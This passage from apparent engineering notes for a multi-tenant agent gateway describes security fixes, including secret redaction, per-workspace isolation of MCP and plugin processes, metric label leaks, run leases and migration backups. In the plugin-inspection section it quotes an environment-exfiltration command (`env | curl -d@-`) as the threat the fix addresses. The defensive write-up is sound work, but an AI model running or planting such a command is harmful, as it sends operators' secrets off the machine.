unmasked them into a database any operator can read across tenants. The
single-user path was the protected one.

**2. Two of `Emit`'s four consumers were unprotected, and they were the two
that leave the process.** `EventHub.Emit` fans out to the action log (a file on
the operator's own disk — redacted), in-process observers, the NATS publisher,
and the WebSocket projection. `tool.call` carries `message.ToolCall.Arguments`
verbatim, so an agent calling an HTTP tool with an `Authorization` header put
that header on every subscriber's socket and every broker subscriber's topic —
while the same operator reading the same call back from history saw it masked.

Redaction is applied at the two **egress** boundaries, `project()` and
`events.NewEnvelope`, not in `Emit`. `redact.Value` normalises through JSON, so
redacting in `Emit` would hand in-process observers a `map[string]any` where
they receive a typed `message.ToolCall` today: changing what leaves the process
is the security fix, and changing what in-process consumers see is a different
change that would have ridden along unannounced.

`Parts` are deliberately **not** redacted. They are the conversation itself,
echoed back to the client displaying it; running the value-shape regexes over
them would rewrite a user's own message in their own transcript, which reads as
corruption rather than protection.

**3. Plugin inspection ran untrusted code with the gateway's whole
environment.** `internal/introspect.DryRun` executes a package's declared
startup hooks *before the operator has decided to install it* — that is the
entire premise of pre-install inspection — and passed `os.Environ()`. A plugin
whose "sidecar" is `sh -c 'env | curl -d@- …'` collected every provider key the
operator held, exited 0, and was reported as a clean dry-run. Every other
subprocess boundary in the repo (tool dispatch, shell tools, the executor pool,
MCP stdio) already went through `sandbox.FilteredEnv`; this one was missed
because it reads as tooling rather than as an execution surface.

The dry-run now gets the base four (`PATH`, `HOME`, `LANG`, `TMPDIR`) with no
extras, because an uninstalled package has no operator-approved `env:`
allowlist yet. `TestAnUninspectedPluginCannotReadTheGatewaysSecrets` asserts on
what the child could **see** — the file it wrote — not on the findings the
dry-run returned, because an exfiltrating hook exits cleanly and is reported as
healthy either way.

### The flow-repair prompt

`internal/runtime/flowadapt` sends a snapshot of live flow variables to a model
when a node fails. It is the most exposed of the four call sites that carried
their own list, because everything it lets through goes **off the machine** —
and it had no redaction test at all. Its list knew `cookie` and `private_key`
but not `passphrase`, `bearer`, `accesskey` or `signing_key`, so a node
argument named `bearer_header` was rendered verbatim into an outbound prompt.

The tests assert through `flowVarsSnapshot` — the function whose result is
concatenated into the prompt — rather than through the predicate, because a
future edit that stops calling the predicate leaves the predicate's own test
passing.

### The guard that generalises the bug

`TestEveryConsumerOfAnEventIsClassified` parses the repo, finds every function
that accepts a `message.Event`, and requires each to either call `redact.Value`
or appear in `eventReaders` **with the reason it does not need to**.

A list of "the sinks I know about" would not have caught any of the three,
because the failure in each case *was* a sink nobody listed. So the guard
discovers its own subjects. The classification distinguishes egress from
sensitivity: a function that pulls two named fields out of a payload and drops
the rest has already discarded everything secret; one that carries the payload
onward has not, however briefly. Thirty-odd consumers are classified into
fan-out, authorization, field extractors, post-redaction writers, and readers
of already-redacted history.

Removing the Postgres redaction makes the guard name that function; removing
either egress redaction makes the boundary's own behaviour test fail with the
secret printed in the diff. Both were verified by mutation.

### Status

MU-015 is closed. Verified with the full `go test ./...`, `make security`
under `-race`, and the GUI suite (840 tests / 76 files).

## MU-017 criterion 5 — MCP processes execute within workspace isolation

The credential half of this criterion closed earlier: `internal/mcp/env.go`
replaced `os.Environ()` with an allow-list, so a third-party MCP server no
longer receives every key the gateway holds. The other half — *workspace
isolation* — could not close, and the reason is one sentence:

**One process cannot be isolated to two tenants.**

The `Client` was built once at boot from `config.yaml`. Every agent in the
deployment called into the same subprocesses, and those subprocesses started
in the gateway's own working directory. So the confinement work had nothing to
confine *to*: a filesystem MCP server pointed at one directory is one directory
for everybody, however carefully that directory is chosen. Two tenants calling
`filesystem__read_file` with the same relative path read the same file.

It is trap #2 from the handoff — a registry keyed by ID alone, where the IDs
are unique per deployment only because there is one tenant — one layer out
from agents.

### The pool

`internal/mcp.Pool` gives each workspace its own processes, started from the
same operator-configured templates but each rooted in that workspace's tree.
Config.yaml servers become **templates every workspace instantiates**, which is
also what criterion 1's "platform-provided extensions are read-only templates"
asks for.

Three things now reach the spawned child, all of which it previously lacked:
its workspace's working directory, the sandbox rlimits (`sandbox.Wrap`), and
the environment allow-list it already had.

**Confinement is asked for, not computed.** `Pool` takes a `Confinement`
interface; the engine implements it by returning `workspaceScratchDir` — the
*same* function that answers where a privileged subprocess starts and where
`read_file` resolves. An MCP server is a subprocess of exactly that kind, and a
second derivation of "this workspace's tree" would be two answers to a question
that must have one. When MU-021's roots move, this moves with them.

**Fail closed, three times over.** A workspace whose confinement cannot be
resolved gets an *empty* client — no servers. Not nil (a dozen call sites would
panic) and not the shared client (that is the bug wearing the name of a
default). `confined()` **overwrites** any `WorkDir` a template named, because
the config most likely to name one is a filesystem server an operator pointed
at a shared directory on purpose — exactly where the tenant boundary has to win
over the operator's convenience.

**Revocation is tombstoned per workspace.** Without that, `RemoveServer` would
be undone the next time that workspace's client was constructed — an operator
edits `config.yaml`, and an extension somebody revoked starts running again,
at a moment unrelated to the revocation.

**Lazy, and the cost is stated.** Per-workspace processes multiply the
subprocess count by the number of *active* tenants, and MCP servers are often
`npx`-launched with a cold download. Clients are created on first use, so a
workspace that never calls an MCP tool spawns nothing. Idle eviction is
deliberately absent: evicting a client mid-call is its own correctness problem,
and a lifetime policy nobody has needed yet would be a second revocation path
beside `RemoveServer`.

### The accessor, and why it needed two tests

`s.mcp` became `s.mcpFor(c)` / `s.mcpForWorkspace(id)` across every gateway
call site, and `e.mcpClient` became `e.mcpFor(ctx)` across the four engine
ones. The engine is both the pool's confinement source and its consumer; the
cycle is resolved by ordering — `SetMCPPool` after `SetFilesystemRoots` and
`SetSandbox` — because the pool only calls back lazily, long after wiring
returns.

Two independent failures needed two guards, because neither catches the other:

- `TestNoHandlerReachesPastTheScopedMCPAccessor` reads the source. The mistake
  is invisible at runtime — `s.mcp` and `s.mcpFor(c)` return the same type,
  both compile, and on a single-tenant deployment they return the same client.
  It only shows up with two tenants in one process, which is the configuration
  nobody has while writing a handler.
- `TestTheAccessorGivesTwoWorkspacesTwoClients` exercises the accessor. An
  `mcpFor` that ignored the pool entirely would satisfy every call site in the
  package and pass the source guard trivially.

The single-tenant fallbacks all live in `mcp_scope.go` — including the config
reload's — so the source guard needs no exemption list. An exemption list is
how a rule like this stops being one.

`TestIsolationEscapeByASharedMCPWorkingDirectory` joins the `make security`
suite: two workspaces get disjoint MCP working directories, and each is the
workspace's *own* tree rather than a scratch namespace beside it. A separate
namespace would be disjoint and still wrong — a server that writes a file the
tenant cannot then read is a feature that appears broken.

Every guard verified by mutation: dropping `cmd.Dir`, falling back to the
template for an unconfined workspace, dropping the revocation tombstone, and
returning the shared client from the accessor each make a named test fail.

### Status

MU-017 criterion 5 is closed. Still open on MU-017: per-workspace wiring of
*plugin* contributions (criterion 1 covers plugins as well as MCP, and the
plugin tool provider is still process-wide), and criterion 7's drain-and-
terminate policy for plugin tool subprocesses, which today applies only to MCP
servers.

## MU-017 criterion 1 — plugin contributions, and the tool subprocess under them

### A scoped store nobody read

`internal/plugins.Stores` — a per-workspace registry of plugin loaders, with
the layered platform/workspace scan order and the shadowing rule — was written
for criterion 1 and **wired to nothing**. `grep` for its constructor returned
one hit: its own definition.

Meanwhile the engine, the only component that decides which plugin tools an
agent may call and then executes them, held a single process-wide
`PluginToolProvider`. So the inventory was scoped and the execution path was
not: workspace A's agent could invoke a tool contributed by a plugin only
workspace B had installed, and A's operator had never seen the code that ran.

That is the most expensive kind of unfinished work, because the shape of the
fix is present and the fix is not — and reviewing either half alone reads as
correct.

`SetPluginProviders` mirrors `SetSkillLoaders` exactly, `e.plugins(ctx)`
resolves it, and both engine call sites (the dispatcher and the tool-schema
builder) go through it. **A nil from the resolver is returned as nil**, never
as a fall-through to the process-wide provider: falling back would hand the
deployment's whole plugin surface to precisely the workspaces the resolver
could not answer for.

The schema builder needed its own test. The resolver being right is not the
same as the schema builder using it, and a tool absent from the schema is one
the model cannot name — so that is the call site that decides what an agent
is even told exists.

### The subprocess the filesystem story missed

While tracing the plugin execution path: `exec.CommandContext` with **no
`cmd.Dir`**, for both plugin tools and ordinary Python tools. Every tool
subprocess in the deployment inherited the gateway's working directory —
whatever the process was started in. Two tenants running a tool that writes
`out.csv` wrote one file, and the second read the first's data back as its own.

It survived because the filesystem *builtins* were fixed and the subprocesses
were not. `read_file` and `write_file` resolve through MU-021's per-workspace
roots and have cross-tenant tests proving it. A Python tool calling `open()` is
a **different process** using the OS's own path resolution; none of that policy
applies to it. The story that scoped the filesystem left the largest filesystem
consumer in the deployment unscoped, and the isolation suite passed because it
exercised the builtins.

`toolWorkDir` returns the same tree the builtins resolve against — not a
sibling scratch namespace, because a tool that writes a file the agent cannot
then read with `read_file` looks broken, and the next person fixes it by
removing the confinement. It returns an ERROR rather than an empty string when
a workspace has no tree, since empty means "inherit", which is the shared
directory again.

Invariant 7: personal resolves to the configured filesystem root. That *is* a
change from the gateway's CWD, and it is the right one — the old location was
wherever systemd or a shell happened to leave the process, which nothing
documents and nobody chose. A single-user install's tools now write where its
builtins write.

### The guard that catches the call site

`TestNoisyNeighbourCannotCollideInAToolSubprocess` asserts `toolWorkDir`
answers differently per tenant. **Deleting the `cmd.Dir` assignment leaves it
passing** — the helper still answers correctly and nothing reads the answer.
That is the exact failure shape the handoff records, and it needed a source
guard.

`TestEverySubprocessStartsInADeliberateDirectory` parses this package, finds
every `exec.Command`/`CommandContext`, and requires the enclosing function to
assign a `Dir` — or to appear in `execWithoutDir` with the reason it needs
none. Four sites are listed: an `id -un` diagnostic, the `sy` CLI delegation
(which resolves its own destination, so a `Dir` here would be a second
silently-disagreeing opinion), the docker version probe, and the docker run
itself (whose container working directory is `-w` in argv, where a host
`cmd.Dir` would have no effect).

An unset `cmd.Dir` is not a visible defect: the process starts, the tool works,
the file lands somewhere. It becomes a cross-tenant bug only when a second
tenant touches the same relative path — not a scenario anybody reproduces while
writing a tool. Both call-site deletions were mutation-verified.

### Status

MU-017 criteria 1, 5 and 7 are closed.

### Revocation had to reach the loader (criterion 7)

`Stores` cached each workspace's loader on first use and never dropped it, so
removing, disabling or re-approving a plugin changed the files on disk and
nothing else. The API answered `{"ok": true}` plus a note telling the operator
to restart — which is a note, not a revocation. An extension somebody has just
decided to stop trusting stayed callable for the life of the process, and the
response said it was gone.

`Invalidate(workspaceID)` drops the cached loader; the engine resolves plugin
tools through `Stores.For` on every dispatch, so the next tool call rescans and
the removed plugin is simply not there. Invalidating rather than mutating the
live loader in place is deliberate: rescanning derives the whole answer from
the directories, where the shadowing rule and the platform/workspace layering
already live. Editing the cached loader would be a second, narrower
implementation of "what does this workspace have" that has to agree with the
scan — and would not, the first time a platform plugin was shadowed.

Invalidation is **per workspace**, not a map clear. One tenant's install must
not force every other tenant to rescan, and in particular must not be the thing
that makes a half-copied plugin directory visible to them mid-write.

`restartNote` stays on the responses, because it remains true for the parts a
rescan cannot reach — sidecar channel processes, GUI mounts and provider
registrations are wired at boot. What changed is that the TOOL surface, the
part an agent can invoke, no longer waits for one.

"Terminate or drain existing processes" is satisfied by construction for plugin
tools: each is a short-lived `exec.CommandContext` bounded by the tool timeout,
so there is no long-running process to kill. That is the difference between
this and the MCP transport's `RemoveServer`, and it is why the two look nothing
alike.

`TestEveryPluginLifecycleChangeInvalidatesTheLoader` is the guard, and it
exists because every behaviour test in `internal/plugins` passes on a build
where the handlers stopped calling `pluginsChanged`: the store still
invalidates correctly and nothing asks it to. The consequence is silent in the
direction of MORE access — a revoke that does not reach the loader returns
`ok:true`, deletes the files, and leaves the tool callable.

## MU-016 — the last criterion was inside a single tenant

Five of six criteria were already met and are recorded above: server-generated
object keys carrying the workspace, authenticated streaming, path containment
after `EvalSymlinks` that fails closed with no roots, `internal/safearchive` as
the only extractor in the repo, and expiry as a query predicate so a revoked
artifact stops downloading immediately rather than at the next sweep.

What remained was *"file tools operate only within **the run's** authorized
mounts"*, and the word doing the work is **run**. Per-workspace confinement is
a tenant boundary; it says nothing about two runs of the *same* tenant. Two
concurrent runs both writing `out.csv` were one file, and the second silently
overwrote the first — a data-loss bug that no tenancy check catches, because
there is no tenancy violation in it.

`runScratchDir` and its cleanup already existed for the privileged shell path
(MU-021). The tool subprocesses did not use it: `toolWorkDir`, written an hour
earlier for the plugin/Python confinement above, resolved to the *workspace*
tree. So `shell_exec` started in the run's scratch and a Python tool started
one directory up — a script written by `run_script` would be looked for
somewhere the next tool did not run.

Pointing `toolWorkDir` at `runScratchDir` closes both: two runs of one
workspace get two directories, both still inside the tenant's tree, and every
tool in a run agrees about where "here" is. The run-less callers — chat,
schedules, channels — fall through to the workspace tree inside
`runScratchDir`, so nothing without a run pays for it.

Worth recording as a near-miss: the per-run mechanism was built, tested and
correct, and the new call site simply did not use it. The test that caught it
is the one asserting `shell_exec` and the tool subprocesses resolve to the
*same* directory — an equality between two components, which neither
component's own test could have expressed.

### Status

MU-016 is closed. M3 (MU-012–019) is complete.

## MU-036 — the metrics endpoint was a cross-tenant read

Six criteria. Two were already met and are worth naming: no `workspace_id`
label anywhere (with the cardinality reasoning written down beside the run
latency histograms), and request-ID correlation through logs. What follows is
the criterion that was not met, and it is a disclosure rather than a
housekeeping problem.

### The exposition is one global document

That sentence is the whole finding. A Prometheus scrape serialises the entire
registry; it cannot be scoped to the caller's workspace. So the role gate on
`/api/v1/metrics` restricts **who** may scrape — owners and admins, in
multi-user mode — but it cannot restrict **what** a scrape contains. Any
workspace's owner read every other workspace's label values.

And four metrics carried an `agent` label whose value is a raw, user-authored
agent ID. Agent IDs are prose somebody typed: `acme-invoice-reconciliation`,
`project-titan-briefing`. That is a customer list, readable by every other
customer's administrators. `soulacy_channel_inbound_total` and
`_outbound_total` carried it too, and `GET /channels/metrics` served the same
values as JSON to anyone who could read channel config in **any** workspace.

The workspace label had been excluded from the start with a paragraph
explaining why. The agent label — same registry, same blob, same argument,
worse because the values are prose — was left alone. A rule applied where
somebody last thought about it rather than everywhere it holds.

### `tool` was the same leak wearing an innocuous name

`tc.Name` is whatever the model called, and only some of those names are
compiled into the binary:

| shape | who chose it |
|---|---|
| `read_file`, `web_search` | this binary |
| a name from SOUL.yaml | the agent's author |
| `plugin__<id>__<tool>` | whoever installed the plugin |
| `mcp__<server>__<tool>` | **since MU-017, a workspace may add its own server** |
| `agent__<peer-id>` | an agent ID |

Four of five are outside this repository. `metrics.ToolLabel` now emits a
**class** (`mcp`, `plugin`, `peer_agent`, `custom`) for everything the binary
does not define, and the exact name only for builtins. Prefixes are checked
**before** the builtin claim, so a caller that is wrong about builtin-ness can
only lose detail, never leak.

This is why the label guard cannot be a blocklist of suspicious label names.
This one is called `tool`.

### Nothing was lost, and that had to be checked

Removing a label is only acceptable if the capability moves somewhere
authorized — criterion 6 says workspace-level diagnostics belong behind an
authorized API, and a removal with no replacement is how the label comes back.
`GET /api/v1/runs/ops-summary` is workspace-scoped through
`OpsSummaryInWorkspace` and already returns `top_failing_agents` with per-agent
run counts and failure rates. The GUI's channel panels sum by channel ID and
never read the agent, so their totals are unchanged — there are simply fewer
series carrying them.

`ChannelCounterRow.Agent` was **deleted** rather than kept and left empty. An
`omitempty` field that is always empty is a slot somebody refills.

### Three guards, because each is blind to the others' failure

- `TestNoMetricLabelIsBoundedByCustomerCount` reads the **declarations**. Every
  label must appear in `boundedLabels` with what bounds its cardinality —
  "the operator configures them" is a bound, "users create them" is not. It
  fails in both directions: a new label, and a stale entry left behind after
  its label is removed, which would be a pre-approved slot with a reason
  already written that nobody has to re-examine.
- `TestAnAgentNameNeverReachesTheSharedMetricsExposition` renders the **actual
  exposition** after driving the real enqueue and send paths. Feeding an agent
  ID in as a `channel` label value passes the declaration guard and fails this
  one — verified by mutation.
- `TestNoIdentifierIsPassedStraightToAMetricLabel` reads the **call sites**,
  repo-wide. Both behaviour tests pass on a build where a dispatcher writes
  `WithLabelValues(tc.Name, "error")`, which is the original bug verbatim.

  It walks the whole repository rather than one package, and that is not
  incidental: the labels belong to `internal/metrics` and the call sites are
  everywhere else, so a guard reading only its own directory would vouch for
  the one package with no call sites in it. `internal/channels` was the second
  package feeding an identifier in, and a runtime-scoped guard would never have
  looked at it. Its exemption map is **empty**, which is the honest state.

That is the third time in this milestone the distinction between "the helper is
correct" and "the call site uses it" has mattered — see also the `cmd.Dir` and
`pluginsChanged` guards. It is worth treating as the default assumption rather
than a lesson each time.

### Status

MU-036 criteria 2 and 6 are closed; 1, 3 and 5 were already met. Criterion 4's
tracing half is **not** met and is not a redaction problem:
`internal/telemetry/tracer.go` returns a no-op provider for every
configuration, and no OTEL dependency is in `go.mod`. There are no trace IDs to
carry correlation, so "logs and traces carry internal correlation IDs" is half
true — logs do, traces do not exist.

## MU-033 — readiness that a load balancer can act on

Criterion 1 (no authoritative state in process memory) is largely already met
and was surveyed rather than rebuilt: session ownership moved to SQLite,
approvals are a durable store, schedule occurrences and durable runs are
claimed in SQL. What remains replica-affine is listed at the end of this
section, because naming it is more useful than half-fixing it.

Criteria 3 and 4 were not met at all.

### `/health` reported the failure and returned 200

`handleHealth` probes what it can reach and reports each dependency in the
body, then returns 200 whatever it found — degrading a JSON *field* from `ok`
to `degraded`. Its own comment says so: "Currently we degrade rather than
returning down — operators can decide via the per-dep statuses returned in the
body."

That is a reasonable contract for a human reading a dashboard and the wrong one
for a load balancer, which reads the status code and nothing else. A replica
whose Postgres had gone away answered 200, stayed in the pool, and took its
share of traffic to fail one request at a time. With one gateway that is
unhelpful; with several it is the difference between losing a replica and
losing a fraction of every user's requests. It also never probed Postgres or
the queue at all.

`GET /ready` is a new endpoint with a status code that means something.
`/health` is left exactly as it is — changing its code would have been the
smaller diff and would have broken every probe already pointed at it.

**Requiredness comes from the deployment mode, and not from a second list.**
`internal/config/deployment.go` already refuses to boot a team deployment
without Postgres, or a scale one without a durable queue. Readiness asks that
same question at runtime. A second list here would eventually disagree with the
one that gates startup, and the disagreement would surface either as a replica
that boots and never becomes ready or — worse — one that stays ready without
the dependency it was told it needed. A personal deployment requires nothing
shared, so its readiness reduces to its liveness: invariant 7 for this
endpoint.

**Fail closed on "unprobeable", not just on "error".** A team deployment whose
Postgres client never got built registers a probe with no check. Reporting that
as ready would make the misconfiguration this endpoint exists to catch look
exactly like health. "We could not tell" and "it is fine" are different
answers.

**Two endpoints, split by what they disclose.** A kubelet cannot present a
credential, and a probe that needs the auth backend reports "not ready"
precisely when auth is what broke — so the probe infrastructure calls must be
unauthenticated. But the useful readiness body is dependency names and driver
error strings, and a driver error is exactly the kind of string that arrives
carrying a DSN or an internal hostname. So `/ready` returns the code and one
word; `/api/v1/ready` returns the detail, to somebody who has already
authenticated.

### Draining, and why the order is the whole mechanism

Shutdown was `<-ctx.Done()` then `s.app.Shutdown()`. Two problems.

Fiber's `Shutdown` waits **forever** for in-flight requests. One agent run
holding a streaming response — the normal case here, not a pathological one —
blocks process exit indefinitely, and the operator or orchestrator resorts to
SIGKILL, which is the ungraceful shutdown the graceful path existed to avoid.

And nothing told the load balancer first. Readiness now fails **before** the
listener closes, with a grace period between, so the balancer has a window to
notice and stop routing. Closing first and de-registering afterwards is the
common shape and it is backwards: every request sent in that window arrives at
a socket that is already going away.

New WebSocket upgrades are refused while draining, before authentication so the
refusal cannot depend on a backend that is leaving with the replica. **Existing
sockets are left alone** — the client's own reconnect lands on a replica still
in the pool and the hub's resume cursor covers the gap, whereas hanging up on
everyone at the start of a drain turns a rolling restart into a simultaneous
reconnect storm.

### The guard that had to be rewritten mid-unit

The first version of the drain-ordering test compared source POSITIONS: does
`BeginDraining` appear before `ShutdownWithTimeout`. Mutation testing killed
it. Moving `BeginDraining` to just after the grace-period sleep removes the
window entirely — the balancer never sees a 503 — and the source positions are
still in order, so the guard passed.

`drainThenStop` now takes the sleep and the stop as arguments, and the test
asserts the replica was **already draining while the grace period elapsed**.
That is the property; source order was a proxy for it that a one-line move
defeats. Both mutations now fail.

### What is still replica-affine (criterion 1)

Recorded rather than fixed, because each is a story:

- `Engine.sessions` holds live conversation state per replica; `historyStore`
  is append-only and is not read back to hydrate a session.
- `ConfirmBroker.pending` is an in-process channel map, so a run paused for
  approval on replica A cannot be released by replica B; startup invalidates
  all pending.
- The event hub's replay buffer is a bounded in-process ring, so a reconnect
  landing elsewhere cannot resume from its cursor.
- `runRegistry` holds cancel functions, so `POST /chat/cancel` only cancels
  runs owned by the replica that receives it.
- `idempotencyStore` is a per-process map, so a retried mutation that lands on
  another replica re-executes.
- The scheduler's auto-disable counters and backfill records are per process,
  though the SQL occurrence claim already prevents duplicate fires.

Each is safe on one gateway and wrong on several. None of them is a tenancy
bug; all of them are correctness-under-replication bugs, which is what the rest
of MU-033 is about.

### Status

MU-033 criteria 3, 4 and 5 are closed (stickiness was never required for
correctness — the SQL claims already handle that). Criterion 1 is partially
met, with the six remaining holders named above. Criterion 2 — consistent
authorization across replicas — follows from the durable stores and is covered
by the existing membership tests.

## MU-034 — a recovery sweep that duplicated live work

The dead-letter queue was already workspace-scoped and wired to a real push
path, and the recovery POLICY was already careful — a run that never acted is
re-queued, one that already called out to the world is failed with the tool
named, one that has burnt its attempts stops being handed to workers. What was
missing turned that careful policy into a bug.

### Claiming a run had no owner and no expiry

Claiming was a status transition, `queued → running`. Recovery therefore could
not tell a worker that **died** from a worker that is **busy**:
`RecoverAcrossWorkspaces` selected every unfinished run in the deployment, and
the startup sweep applied the policy to each one.

On one gateway that is exactly right — nothing else is running, so every
unfinished run really was interrupted. On two, replica B booting re-queues runs
replica A is executing at that moment, and the agent runs twice. A rolling
restart, which is how a second replica normally appears, duplicates everything
in flight on **every deploy**.

The lease makes "interrupted" observable. `claimed_by` records who holds the run
and `lease_expires_at` until when; the holder renews while it works; recovery
considers only runs whose lease has lapsed. A live worker's runs are invisible
to the sweep; a dead worker's become visible when nothing renews them.

**The shape is `internal/schedules/claim.go`'s, deliberately.** That package
already solved this for scheduled occurrences — owner column, expiry column,
steal conditioned in the WHERE clause — and a second design for the same
problem in the same deployment would be two things to reason about.

**Renewal rather than a long lease, and the trade is symmetrical.** The lease
has to outlive any pause a live worker can take — a slow provider call, a
stop-the-world GC, a machine that swaps — or a healthy run is stolen and
executed twice, which is the failure the lease exists to prevent arriving from
the other direction. A lease long enough for the worst pause is also long
enough that a real crash strands the run for that long. Renewal at a third of
the lease decouples them, and a third rather than a half so that **two**
consecutive renewals can fail — because the second failure is the one that
happens under load, which is when the machine is busy enough to drop one.

**A lost lease cancels the run.** If renewal fails because somebody else holds
the claim, this worker is executing a run another worker also has. `finishRun`'s
status-conditioned UPDATE would refuse this one's outcome anyway — but only
cancelling stops it making tool calls in the meantime.

**A clean shutdown releases the lease.** Without that, every ordinary restart
would pause in-flight work for a full lease period, which operators would
correctly read as the lease making things worse and would respond to by
shortening it until it stopped protecting anything.

**A NULL expiry is unheld, not held forever.** Every run written before this
change has one. Reading a missing lease as held would make them permanently
invisible to recovery — a silent regression appearing only on upgraded
deployments, and only for work in flight during the upgrade.

### A migration that broke on the next column

Adding the two columns surfaced `migrateRunPrimaryKey` copying rows with
`INSERT INTO agent_runs SELECT * FROM agent_runs_pre_composite`. `SELECT *`
requires identical column counts, so that migration breaks every time a column
is added to `schema` — failing at `Open`, on exactly the old databases it exists
to rescue, and never on a fresh one. It now names the pre-composite columns
explicitly; new columns are added afterwards by the additive migration.

### Retry was the missing third of criterion 5

Inspect and discard existed; retry did not. A dead letter is the only record of
a job that failed with nobody watching, and the available actions were to read
it and to throw it away — so an operator whose job died on a transient provider
error had to reconstruct the request by hand from the payload, which is a copy
of a user's message.

**The workspace comes from the ROW, never from the payload.** The payload is a
serialized `message.Message`, and that struct has a `WorkspaceID` field sitting
right there; reading it is the obvious implementation and it is the bug. The
row's `workspace_id` was recorded by the gateway from a verified principal; the
payload is content. This is MU-018's rule — inbound identity is stamped after
the adapter, not by it — and it matters more here because the tempting field is
already parsed.

**Delete only after the enqueue succeeds.** A retry that discarded the entry
because the inbox was full would lose the job permanently, and a full inbox is
exactly the condition under which an operator is retrying things. If the retry
fails again the engine parks a fresh entry with the new error, so the operator
sees the second failure rather than the first.

`s.dlqScope(c)` is passed **inline** at every store call rather than hoisted
into a variable, because `TestSharedStoreReadsNameATenant` requires it — and
the requirement is right even though a variable reads better. The guard is
syntactic so it cannot be argued with; making it smart enough to follow a
variable would make it smart enough to be wrong.

### The call-site guard, for the fourth time

Every behaviour test for the lease passes on a build where the production path
claims a run and never renews — the primitives are correct and nothing uses
them — and on a build that claims **anonymously**, which cannot renew at all
because `RenewLease` refuses an empty owner by design.
`TestEveryRunClaimAlsoHoldsItsLease` reads the call site for both.

### Status

MU-034 criteria 1, 2, 3, 4 and 5 are closed. Criterion 6 — chaos tests covering
crashes before/after claim, provider call, tool side effect, event publish and
result commit — is **not**. The lease and the side-effect marker are what make
those tests expressible, so it is now buildable where before it was not; the
existing `chaos_test.go` covers plugin-manifest loading only.

## MU-035 — the backup gate was a word, not a gate

Criterion 5 (single-workspace export without exposing others) was already
closed by MU-032's `internal/workspaceexport`. Criteria 3 and 4 were partly
met in a way worth being precise about, because the missing part was the part
that does the work.

### `Destructive: true` protected nothing

`internal/sqlitex` already had a real versioned migration runner: one
transaction per step, strictly ascending versions, idempotent skip, and an
additive-only guard that refuses `DROP`/`RENAME` unless the step sets
`Destructive`.

But `Destructive` was an opt-out from that check **and nothing else**. Any
migration could set it, and the only thing between a mistaken `DROP` and
permanent loss was that somebody had typed a word acknowledging the risk. A
field that says "I know this is dangerous" is a comment with a compiler behind
it.

Now a destructive step takes a real snapshot first and records where it put it.
If the snapshot cannot be taken, the migration does not run — which is what
makes it a gate rather than an acknowledgement: the protection is a side effect
the step cannot skip without failing.

**`VACUUM INTO`, not a file copy.** Copying the file behind a live connection
can capture a torn page or miss the WAL entirely, producing a backup that
restores to a database SQLite refuses to open. That is the worst possible
outcome, because it looks like a backup right up to the moment somebody needs
it. `VACUUM INTO` writes a consistent snapshot through SQLite itself, WAL
included. Every test here **opens the backup and reads the dropped row out of
it** — a file of the right size passes any test that only checks the path
exists.

**An in-memory database is refused, not waived.** It has no file to snapshot,
and waiving the gate there would make it absent precisely where it cannot be
satisfied — a rule that protects only the cases that were already safe.

**The snapshot is named for the version it precedes, not the time.** An
operator asking "what did this look like before v7" should not have to
correlate timestamps, and a fixed name makes a retried migration overwrite its
own snapshot instead of leaving one database-sized file per attempt. Unbounded
accumulation of those is how a protection becomes an outage.

### Nothing read the versions back

Every store recorded its schema version and nothing exposed it. The versions
were correct, the migrations transactional, the additive guard holding — and an
operator asking "did the upgrade apply" had to open thirteen database files
with a SQLite client.

That matters most during the event the versioning exists for: a rolling upgrade
puts two binaries against one set of databases, and the question of whether
every component has reached the version this binary expects was unanswerable
from the running system. It is also what makes the backup gate usable — a
snapshot nobody can list is a snapshot nobody will find.

`GET /api/v1/admin/schema` reports it, behind the same owner/admin gate as the
raw metrics endpoint, because a schema version describes the deployment rather
than a tenant.

**`ReportDir` discovers rather than enumerates.** A list of expected databases
cannot report the one nobody wired — a store added without versioning, a file a
migration left behind — and those are the rows an operator most wants. Same
choice the ownership catalog's discovery scan makes. A file that cannot be
opened is reported **with its error** rather than skipped, because a corrupt
database silently absent from a report reads as a database that is fine.

**Read-only, through a separate code path.** `SchemaReport` creates its tables
if absent, which is right for a store bootstrapping itself and wrong for a
report: it would add a version table to somebody else's database as a side
effect of looking at it.

### A test whose premise was wrong

The first version of the read-only test asserted that reporting an *empty*
directory created no files. It passed with `mode=ro` removed — `ReportDir` only
iterates over files that already exist, so a plain-path open never creates one.
The premise was wrong: `mode=ro` is about not *writing* to a live store, not
about not creating one. It now reports a database that predates versioning and
asserts no `soulacy_*` table was added to it. Recorded because the test looked
correct and tested nothing.

### What is NOT closed, and why I did not guess

- **Criterion 1 — documented RPO/RTO targets.** These are commitments about a
  specific deployment's infrastructure (snapshot cadence, replica lag, restore
  drill frequency). Writing numbers into this repo would be inventing an SLA on
  the operator's behalf.
- **Criterion 2 — restore tests across relational data, objects, vector
  references and encrypted secrets.** The SQLite half is now testable and
  partly tested (the backup gate's tests restore and read). The Postgres and
  object-store halves need a live Postgres and a live bucket.
- **Criterion 3, Postgres half.** `internal/storage/postgres/schema.sql` is
  annotated for goose, goose is not in `go.mod`, there is no migrations
  directory and no runner call site — it is applied by hand. Adopting the
  `MigrateSchema` shape for Postgres is the right fix and needs a live Postgres
  to exercise; shipping untested migration SQL for the tenant backend is worse
  than shipping none.

### Status

MU-035 criterion 4 is closed, criterion 3's observability half is closed and
its Postgres half is not, criterion 5 was already closed, and criteria 1 and 2
need infrastructure decisions rather than code.

## MU-037 — the gate was narrower than the coverage

### What was there, and why it did not count

Thirty-odd packages had real cross-tenant tests: two workspaces stood up, an
adversary trying to reach across, colliding names. And `make security` — the
target a release actually runs — executed exactly three things: one filtered
run of `internal/runtime`, plus `internal/ownership` and `internal/runs`.

Broad coverage with a narrow gate is the worst arrangement of the two. Every
one of those suites could rot, be deleted, or start passing for the wrong
reason, and the release gate would stay green throughout. **Coverage nobody
runs at the moment of release is documentation.**

MU-037's own word for what it wants is "objective", and a gate whose contents
are decided by whoever last edited a Makefile is not that.

### The inventory is the source of truth

`internal/releasegate` declares each surface the criterion enumerates — routes,
repositories, event types, queue, filesystem operations, vector queries,
exports, and the rest — with the package that covers it, the test files that do
the covering, and a sentence saying **what the adversary attempts**. That last
field is required by `Validate`, because "internal/x is tested" is
unfalsifiable while "an agent in workspace A names workspace B's file by
absolute path" is not.

`Packages()` returns the list the gate must run, and the Makefile is **checked
against it**. Adding a surface without extending the gate fails the build. The
Makefile keeps the list in text because it is edited by hand, and the check
tells whoever edits it what they left out — which is the useful direction.

Four failure directions, each mutation-verified:

- a surface naming a test file that does not exist — an inventory of absent
  tests is worse than none, because it reports the surface as covered;
- a surface in a package the gate does not run;
- a `Criterion` that is a paraphrase rather than a quote from the backlog, so
